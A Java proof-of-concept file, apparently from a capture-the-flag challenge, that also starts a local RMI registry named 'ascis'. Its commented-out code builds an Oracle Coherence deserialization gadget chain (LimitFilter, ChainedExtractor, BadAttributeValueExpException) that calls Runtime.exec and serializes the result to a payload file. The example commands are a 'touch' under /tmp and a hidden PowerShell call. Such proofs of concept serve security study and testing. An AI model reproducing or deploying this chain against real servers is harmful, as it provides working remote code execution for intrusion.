import com.tangosol.util.filter.LimitFilter;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class POC {

    public static void main(String args[]) throws Exception
    {
//        //Create object:
//        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{ "getRuntime", new Class[0] });
//        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{ null, new Object[0] });
//        //For Linux shell:
//        //ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "/bin/sh", "-c", "touch /tmp/Qynklee_POC" } });
//        //For Windows shell:
//        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "cmd.exe", "/c", "powershell.exe -nop -w hidden -noni -c \"notepad.exe\" " } });
//
//        //Init ChainedExtractor ( 3 ReflectionExtractor )
//        ReflectionExtractor extractors[] = { extractor, extractor2, extractor3 };
//        ChainedExtractor chainedExt = new ChainedExtractor(extractors);
//        LimitFilter limitFilter = new LimitFilter();
//
//        //chain 1: Set m_comparator = 1 chainedExtractor Object
//        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
//        m_comparator.setAccessible(true);
//        m_comparator.set(limitFilter, chainedExt);
//
//        //chain 2:
//        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
//        m_oAnchorTop.setAccessible(true);
//        m_oAnchorTop.set(limitFilter, Runtime.class);
//
//        //chain 3:
//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
//        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
//        field.setAccessible(true);
//        field.set(badAttributeValueExpException, limitFilter);

        //Debug: Create Server:

        try {
            Registry registry = LocateRegistry.createRegistry(1990);
            registry.rebind("ascis", new ASCISInterfImpl());
            System.out.println("ASCIS server is ready");
        } catch (Exception var2) {
            var2.printStackTrace();
        }


        // Serialize object & save to file
//        FileOutputStream fos = new FileOutputStream("payload_obj.ser");
//        ObjectOutputStream os = new ObjectOutputStream(fos);
//        os.writeObject(badAttributeValueExpException);
//        os.close();

    }
}
